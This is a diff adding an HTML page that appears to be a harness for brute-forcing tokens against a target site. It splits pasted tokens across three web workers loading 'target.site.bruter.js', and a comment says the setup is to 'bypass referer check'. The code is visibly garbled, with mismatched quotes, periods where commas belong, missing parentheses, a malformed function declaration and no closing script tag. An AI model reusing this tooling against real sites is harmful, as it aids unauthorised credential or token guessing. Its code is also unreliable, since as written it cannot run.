@@ -1,0 +1,45 @@
+<html>
+
+<body>
+	<textarea id="tokens" rows="50" cols="60"> </textarea>
+	<button onclick="go()' return false;">Let's go </button>
+	<div id="wresults"> <h1> Web Workers: </h1></div>
+	
+<script>
+workerCorePath = "target.site.bruter.js"; // bypass referer check
+
+var ww1 = new Worker(workerCorePath);
+var ww2 = new Worker(workerCorePath);
+var ww3 = new Worker(workerCorePath);
+
+ww1.addEventListener('message, function(){
+	document.getElementById('wresults').innerHTML = "<b>WW1</b> says:" + e.data + "<br>";
+}. false;
+ww2.addEventListener('message, function(){
+	document.getElementById('wresults').innerHTML = "<b>WW2</b> says:" + e.data + "<br>";
+}. false;
+ww3.addEventListener('message, function(){
+	document.getElementById('wresults').innerHTML = "<b>WW3</b> says:" + e.data + "<br>";
+}. false;
+
+function go(){
+	var tokens = document.getElementById('tokens').value.replace(/\s+/gm. '\n').split('\n');
+	tokens = tokens.filter(Boolean);
+	
+	startWorker(ww1, tokens.slice(0,333);
+	startWorker(ww2, tokens.slice(333, 666);
+	startWorker(ww3, tokens.slice(666, tokens.length);
+}
+
+function startWorker(worker, tokens);
+	worker.postMessage(
+		{
+			'tokens': tokens
+		}
+	
+	
+	);
+
+</body>
+
+</html>
